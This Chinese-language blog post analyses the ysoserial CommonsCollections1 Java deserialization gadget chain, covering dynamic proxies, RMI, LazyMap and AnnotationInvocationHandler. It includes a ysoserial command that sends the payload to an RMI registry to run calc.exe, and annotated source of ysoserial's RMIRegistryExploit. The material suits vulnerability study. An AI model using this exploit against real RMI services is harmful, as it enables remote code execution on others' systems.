![](https://image.3001.net/images/20210607/1623076071_60be2ce7e0d656fe0c0f1.png!small)

## 0x01：前言

上篇文章对[Apache Commons
Collections反序列化漏洞利用链](https://mp.weixin.qq.com/s?__biz=MzI0MjgyNDA5NQ==&mid=2247483715&idx=1&sn=bda48a95891b8a4533fbe1535d1ac75b&chksm=e97727b3de00aea5e21cfa1407e669da095fed826733265e0beb93107e434178b8329f6cfe32&token=1359929470&lang=zh_CN#rd)进行了分析，也埋坑说要结合此漏洞，深入分析ysoserial反序列化工具，本文也算是填坑之作。

ysoserial是一款知名的java反序列化利用工具，里面集合了各种java反序列化payload，而其中CC1链和上篇文章的利用点也有所不同，也涉及到了动态代理和RMI等一些新知识。

## 0x02：基本概念

### 1）java动态代理

代理是一种常用的设计模式，其目的就是为真实对象提供一个代理对象以控制对真实对象的访问，或在真实对象原有的功能上，增加额外的功能。代理类负责为委托类（被代理类、真实类）预处理消息，过滤消息并转发消息，以及进行消息被委托类执行后的后续处理。按照代理的创建时期，代理类可分为两种：动态代理和静态代理。

动态代理是指利用Java的反射技术在运行时生成代理类对象。

 **示例业务逻辑：** 如果要找Jaychou唱歌、演戏，需要先找两个助理中的一个，然后助理去找Jaychou唱歌、演戏。

![](https://image.3001.net/images/20210607/1623072330_60be1e4a137023eb691b7.png!small)

proxy类和InvocationHandler接口是动态代理的两个核心机制，其通过相互配合来实现动态代理：

> Proxy类就是用来创建一个代理对象的类，它提供了很多方法，但最常用的是newProxyInstance方法。
>
>  
>
>
>
> InvocationHandler接口是proxy代理实例的调用处理程序实现的一个接口，每一个proxy代理实例都有一个关联的调用处理程序；在代理实例调用方法时，方法调用被分派到调用处理程序的invoke方法。其相当于一种代码增强，即在原先的方法逻辑上加上额外操作，在方法执行之前和之后加点通用逻辑，方便实现和维护。

###  **2）RMI  
**

RMI(Java Remote Method
Invocation)：java远程方法调用，是一种用于实现远程过程调用的应用程序编程接口，它使客户机上运行的程序可以调用远程服务器上的对象。其用于不同JAVA虚拟机之间的通信，这些JAVA虚拟机可以在不同的主机上，也可以在同一主机上。

简单来说，就是两台服务器A，B，一个应用部署在A服务器上，想要调用B服务器上应用提供的函数/方法，由于不在一个内存空间，不能直接调用，需要通过网络来表达调用的语义和传达调用的数据。

RMI主要分为三部分：

> RMI Registry注册中心
>
> RMI Client 客户端
>
> RMI Server服务端

其中RMI注册中心是一个放置所有服务器对象的名称空间。服务器每次创建一个对象时，都会向RMIregistry注册该对象(使用 **bind( )** 或
**reBind( )** 方法)，这些是使用称为绑定名称的唯一名称注册的。

要调用远程对象，客户端需要该对象的引用。那时，客户端使用其绑定名称(使用 **lookup( )** 方法)从注册表中获取对象。

> ​1、客户端调用客户端本地的stub类(相当于代理，用于与服务器端的通信)  
> 2、客户端本地的stub类把信息序列化发给服务器端的skeletons类(也可认为是代理)  
> 3、服务器端的skeletons类把信息反序列化交给服务器端的对应类进行处理  
> 4、服务器端对应类处理完后将结果返回给服务器端的skeletions类  
> 5、skeletions类序列化数据发送给客户端本地的stub类  
> 6、客户端本地的stub类把数据反序列化后将结果返回给客户端

![](https://image.3001.net/images/20210607/1623072479_60be1edf34e0cc11179d3.png!small)
**RMI服务器实现**  
在Java中，只要一个类继承了java.rmi.Remote接口，即可成为存在于服务器端的远程对象，供客户端访问并提供一定的服务。Remote接口用于标识其方法可以从非本地虚拟机上调用的接口。任何远程对象都必须直接或间接实现此接口。只有在远程接口中指定的这些方法才可被远程调用。

![](https://image.3001.net/images/20210607/1623072532_60be1f14548237f5ffab5.png!small)

远程对象必须实现java.rmi.server.UniCastRemoteObject类，这样才能保证客户端访问获得远程对象时，该远程对象将会把自身的一个拷贝以Socket的形式传输给客户端，此时客户端所获得的这个拷贝称为“存根”，而服务器端本身已存在的远程对象则称之为“骨架”。其实此时的存根是客户端的一个代理，用于与服务器端的通信，而骨架也可认为是服务器端的一个代理，用于接收客户端的请求之后调用远程方法来响应客户端的请求。

![](https://image.3001.net/images/20210607/1623072681_60be1fa961b048ad04aef.png!small)注册远程对象，向客户端提供远程对象服务，远程对象是在远程服务上创建的，你无法确切地知道远程服务器上的对象的名称，但是，将远程对象注册到RMI注册中心之后，客户端就可以通过RMI中心请求到该远程服务对象的stub了，利用stub代理就可以访问远程服务对象了。

![](https://image.3001.net/images/20210607/1623072716_60be1fcc0ca73b84e3d66.png!small)客户端实现RMI远程方法调用。

![](https://image.3001.net/images/20210607/1623072756_60be1ff499ac0a789f7a4.png!small)

##  **0x03：​YsoserialCC1利用链构造分析**

Apache Commons
Collections主要提供了两个类，TransformedMap和LazyMap类，其可以修饰一个Map数据，当对该Map数据进行具体操作时就会触发transform过程。Apache
Commons Collections反序列化的CC链主要使用的是TransformedMap类，而Ysoserial
CC1链主要使用的是LazyMap类。

TransoformedMap类的关键点在checkSetValue()方法，我们构造好的含有利用代码的ChainedTransformer利用链即transformers数组会循环进入此处。

![](https://image.3001.net/images/20210607/1623073005_60be20edafef41a1324b3.png!small)而Ysoserial
CC1链使用的LazyMap类关键点在其get( )方法，会触发transform过程。

![1623073053_60be211dd630f5ae9eea6.png!small?1623073055320](https://image.3001.net/images/20210607/1623073053_60be211dd630f5ae9eea6.png!small?1623073055320)

在不看CC1链具体代码之前，我们不妨先尝试构造一下这个利用链。

要想触发transform过程，此时this.factory的值就需为我们构造好的利用代码即ChainedTransformer利用链，当调用LazyMap对象的get方法时就会触发命令执行。

那this.factory参数是否是可控的？

LazyMap的构造函数是受保护protected的，只有他自身或者继承他的类可以用，我们不能通过构造函数传参。但其有一个decorate()方法，其参数2为Transformer类型，因此可以利用这个方法创建一个LazyMap对象，相关代码如下：![1623073111_60be215701b8b125e3c44.png!small?1623073112458](https://image.3001.net/images/20210607/1623073111_60be215701b8b125e3c44.png!small?1623073112458)但要利用此漏洞，就需要通过网络传输payload，在服务端对我们传过去的payload进行反序列时执行代码，而该POC的关键依赖于调用lazyMap.get()方法，而这完全不可控。

因此就需要寻找一个特定的可序列化类，该类重写了readObject( )方法，并且在readObject(
)中调用了lazyMap的get()方法。需要注意的是，在java中如果重写了某个类的方法，就会优先调用经过修改后的方法。

Ysoserial CC1链中利用的还是在上篇文章中分析过的AnnotationInvocationHandler类，该类重写了readObject(
)方法，但其并没有明确的调用get()方法，此时就使用到了动态代理。

AnnotationInvocationHandler类实现了InvocationHandler接口，其invoke( )方法，代码如下：

![1623073155_60be2183268167de549f4.png!small?1623073156883](https://image.3001.net/images/20210607/1623073155_60be2183268167de549f4.png!small?1623073156883)

如上代码所示，其主要作用是当代理的对象调用toString，hashCode，annotationType时，就返回相应的结果，如果调用了其他方法，就会去执行Object
var6= this.memberValues.get(var4)。

那如果this.memberValues是可控的，且其为Map类型，就可以达到我们的目的，查看其构造函数，this.memberValues正好是Map类型。

![1623073186_60be21a27e494ae349a55.png!small?1623073188002](https://image.3001.net/images/20210607/1623073186_60be21a27e494ae349a55.png!small?1623073188002)

目前只要可以调用AnnotationInvocationHandler实例对象的invoke方法就可以触发攻击链，导致代码执行。

前文提到每一个proxy代理实例都有一个关联的调用处理程序InvocationHandler，而invoke方法就是代理对象调用方法时的调用处理程序。

因此我们需要构造一个动态代理的对象，让其调用方法，从而触发invoke方法。

接着看AnnotationInvocationHandler的readObject方法。

![1623073221_60be21c5a9a3f8bcb072b.png!small?1623073223198](https://image.3001.net/images/20210607/1623073221_60be21c5a9a3f8bcb072b.png!small?1623073223198)

this.memberValues是可控的，当其是一个AnnotationInvocationHandler类生成的动态代理对象时，在调用entrySet()方法时，会自动去调用invoke方法，而由于其调用的不是toString，hashCode等方法，就会执行Object
var6 = this.memberValues.get(var4)，从而完成攻击链条，导致代码执行。

攻击链条：

> 反序列化数据流  
> 执行redObject()方法  
> 执行this.memberValues.entrySet()方法  
> 触发InvocationHandler的invoke方法  
> 执行invoke方法里的this.memberValues.get()  
> 调用LayzMap的get()方法  
> 执行get方法里的this.factory.transformer()  
> 调用chainedTransformer的transform方法  
> 循环调用InvokerTransformer的transform方法构造Runtime对象  
> 执行Runtime对象的exec方法

##  **0x04：YsoserialCC1链源码分析**

启动RMI服务

![1623073336_60be2238217a4e5d9dc0a.png!small?1623073337847](https://image.3001.net/images/20210607/1623073336_60be2238217a4e5d9dc0a.png!small?1623073337847)

使用ysoserial工具来给本地的RMI服务器发送payload：

> java -cp ysoserial-master-d367e379d9-1.jar
> ysoserial.exploit.RMIRegistryExploit 192.168.1.5 777 CommonsCollections1
> "calc.exe"

![1623073413_60be22858ca78fd0200a7.png!small?1623073415909](https://image.3001.net/images/20210607/1623073413_60be22858ca78fd0200a7.png!small?1623073415909)

可以看到，使用的是ysoserial.exploit.RMIRegistryExploit类，跟进该类。

    
    
    public class RMIRegistryExploit {
       ..............
       public static void main(final String[] args) throws Exception {
          //获取到命令的第一个参数 即RMI服务端IP 192.168.1.5 
          final String host = args[0];
    ​
          //获取到命令的第二个参数 即RMI服务端端口 777 
          final int port = Integer.parseInt(args[1]);
    ​
          //获取的要执行的命令 "calc.exe"
          final String command = args[3];
    ​
          //获取192.168.1.5:777 上存在的RMI服务
          Registry registry = LocateRegistry.getRegistry(host, port);
    ​
          //获取paylaod类名即：ysoserial.payloads.CommonsCollections1
          final String className = CommonsCollections1.class.getPackage().getName() +  "." + args[2];
    ​
          //获取ysoserial.payloads.CommonsCollections1类的对象
          final Class<? extends ObjectPayload> payloadClass = (Class<? extends ObjectPayload>) Class.forName(className);
    ​
          // test RMI registry connection and upgrade to SSL connection on fail
          try {
             registry.list();
          } catch(ConnectIOException ex) {
             registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
          }
    ​
          //将获取到的RMI服务对象，payloads所在的类CommonsCollections1类的对象，要执行的命令作为参数传入，调用exploit方法   
          // ensure payload doesn't detonate during construction or deserialization
          exploit(registry, payloadClass, command);
       }
    ​
       public static void exploit(final Registry registry,
             final Class<? extends ObjectPayload> payloadClass,
             final String command) throws Exception {
          new ExecCheckingSecurityManager().callWrapped(new Callable<Void>(){public Void call() throws Exception {
             //获取CommonsCollections1类无参构造器运行时类的对象
             ObjectPayload payloadObj = payloadClass.newInstance();
    ​
             //调用CommonsCollections1类运行时类的对象的getObject方法，并将要执行的命令作为参数传入 
             //getObject方法 即前文Client利用代码
             Object payload = payloadObj.getObject(command);
             String name = "pwned" + System.nanoTime();
    ​
             //使用基于AnnotationInvocationHandler的动态代理，从而加载rmi协议指定的类
             Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
             try {
                //将远程引用绑定到RMI注册服务器中的指定name 
                registry.bind(name, remote);
             } catch (Throwable e) {
                e.printStackTrace();
             }
             Utils.releasePayload(payloadObj, payload);
             return null;
          }});
       }
    }

重点关注的代码部分如下：

![1623073886_60be245ef2b0fd0230855.png!small](https://image.3001.net/images/20210607/1623073886_60be245ef2b0fd0230855.png!small)

 **ysoserial.payloads.CommonsCollections1类**

> //payloadClass为获取的ysoserial.payloads.CommonsCollections1类的对象
>
> //payloadObj即获取的CommonsCollections1类无参构造器运行时类的对象
>
> ObjectPayload payloadObj = payloadClass.newInstance();
>
> Object payload = payloadObj.getObject(command);

调用CommonsCollections1类运行时类的对象的getObject方法，并将要执行的命令作为参数传入 ，跟进getObject方法。

![1623074000_60be24d0b62ca9c7b1a69.png!small?1623074002359](https://image.3001.net/images/20210607/1623074000_60be24d0b62ca9c7b1a69.png!small?1623074002359)

前半部分代码不再详细解释，上篇文章有分析，主要是生成ChainedTransformer实例，把一些transformer链接到一起，构成一组链条，对一个对象依次通过链条内的每一个transformer进行转换。

蓝框的代码先是生成一个Map实例，并调用LayMap的decorate()方法，将Map实例和ChainedTransformer实例作为参数传入，创建一个LazyMap对象，之后利用了两层的动态代理来封装lazyMap对象。

![1623074163_60be2573e4278c3ff4b3a.png!small?1623074165369](https://image.3001.net/images/20210607/1623074163_60be2573e4278c3ff4b3a.png!small?1623074165369)

第一次调用createMemoitizedProxy生成mapProxy代理对象，层层跟进：

![1623074204_60be259c473b91307834f.png!small?1623074205826](https://image.3001.net/images/20210607/1623074204_60be259c473b91307834f.png!small?1623074205826)

此时就用到了在前文提到的动态代理的两个核心机制，proxy类和InvocationHandler接口。和该类最常用的是newProxyInstance方法。

此处使用proxy.newProxyInstance()方法生成代理对象，该方法有三个参数。

> 参数一loader：生成代理对象使用哪个类装载器【一般使用的是被代理类的装载器】
>
> 参数二interfaces：生成哪个对象的代理对象，通过接口指定【指定要被代理类的接口】
>
> 参数三h：生成的代理对象的方法里干什么事，动态代理方法在执行时，会调用h里面的invoke方法去执行【即InvocationHandler接口的实现】

其中参数三就是前文提到的InvocationHandler接口的实现，动态代理方法在执行时，会调用里面的invoke方法去执行，此处参数三ih即AnnotationInvocationHandler的实例对象。

> //ANN_INV_HANDLER_CLASS="sun.reflect.annotation.AnnotationInvocationHandler"
>
> (InvocationHandler)
> Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class,
> map);

而其中lazyMap赋给了AnnotationInvocationHandler实例对象的memberValues属性。

![1623074322_60be2612348a332894ad4.png!small?1623074323675](https://image.3001.net/images/20210607/1623074322_60be2612348a332894ad4.png!small?1623074323675)

因此当动态代理在调用方法时，会调用AnnotationInvocationHandler的invoke方法，从而调用this.memberValues.get()。

![1623074580_60be27147513c7f7ef9c2.png!small?1623074581918](https://image.3001.net/images/20210607/1623074580_60be27147513c7f7ef9c2.png!small?1623074581918)

同样第二次调用createMemoizedInvocationHandler生成handler代理对象，将mapProxy对象赋给AnnotationInvocationHandler的memberValues属性。之后将生成的handler代理对象返回。

![1623074771_60be27d35c53c3430fb1d.png!small](https://image.3001.net/images/20210607/1623074771_60be27d35c53c3430fb1d.png!small)

二次调用后的memberValues关系大致如下：

> handler.memberValues == mapProxy
>
> mapProxy.handler.memberValues == lazyMap

 **反序列化**

返回到ysoserial.exploit.RMIRegistryExploit类，继续往下看，调用createMemoitizedProxy生成remote代理对象，CommonsCollections1类返回的handler对象会作为createMap的参数传入。

![1623075018_60be28ca051cdbd819a9a.png!small](https://image.3001.net/images/20210607/1623075018_60be28ca051cdbd819a9a.png!small)

跟进createMap，此处生成了一个map对象，并更新了一组数据{key为"pwned”加随机时间,val为handler代理对象}。

![1623075072_60be29009ddb01546c1b3.png!small](https://image.3001.net/images/20210607/1623075072_60be29009ddb01546c1b3.png!small)

调用createMemoitizedProxy生成remote代理对象，将map赋给它的AnnotationInvocationHandler的memberValues属性，而Map的value为handler对象。

![1623075126_60be29363c0987742ddaf.png!small?1623075127824](https://image.3001.net/images/20210607/1623075126_60be29363c0987742ddaf.png!small?1623075127824)

生成的remote代理对象会作为registry.bind()的参数传入，向RMI注册中心序列化传输远程对象。

当RMI注册中心反序列远程对象时，会调用AnnotationInvocationHandler类重写的readObject方法。

![1623075178_60be296a76bd77bdc9834.png!small?1623075180952](https://image.3001.net/images/20210607/1623075178_60be296a76bd77bdc9834.png!small?1623075180952)

当readObject方法执行entrySet()时，动态代理会调用AnnotationInvocationHandler的invoke方法，而this.memberValues为lazyMap实例。

invoke方法里的this.memberValues.get()，即调用lazyMap的get()方法。

![1623074580_60be27147513c7f7ef9c2.png!small](https://image.3001.net/images/20210607/1623074580_60be27147513c7f7ef9c2.png!small)

调用lazyMap的get()方法，从而触发transform利用链，造成远程代码执行，而这跟我们之前构造的利用链是相吻合的。

![1623075320_60be29f877a635a1262cf.png!small](https://image.3001.net/images/20210607/1623075320_60be29f877a635a1262cf.png!small)

​攻击链条：

![1623075894_60be2c3691871913b637d.png!small?1623075895996](https://image.3001.net/images/20210607/1623075894_60be2c3691871913b637d.png!small?1623075895996)

##  **0x05：结语**

ysoserial cc1链和Apache Commons
Collections反序列化利用链的点还是有些区别，也涉及到了动态代理等一些新知识，比较复杂，而ysoserial的利用链还有很多，需要去不断深入分析，尽快填坑吧~

最后，欢迎大家关注我的公众号：安不识TM，以后的文章会第一时间发在这个平台。

##  **0X06：参考资料**

[1] https://mp.weixin.qq.com/s/bC71HoEtDAKKbHJvStu9qA

[2] https://zrquan.github.io/posts/ysoserial-cc1/#反序列化

